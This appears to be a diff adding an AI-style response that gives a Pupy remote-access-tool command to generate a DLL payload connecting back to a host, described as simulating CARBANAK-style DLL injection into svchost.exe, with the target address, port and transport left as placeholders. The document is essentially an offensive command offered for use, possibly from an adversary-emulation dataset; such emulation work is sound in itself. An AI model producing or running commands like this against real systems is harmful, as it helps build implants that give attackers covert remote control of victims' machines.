@@ -1,0 +1,5 @@
+Here are the command lines to simulate the CARBANAK DLL injection into the svchost.exe process using Pupy:
+
+Command: `gen -f dll connect --host <target_ip>:<port> -t <transport>`
+
+Please note that I have replaced specific parameters with placeholders (<target_ip>, <port>, and <transport>) as per the instructions.
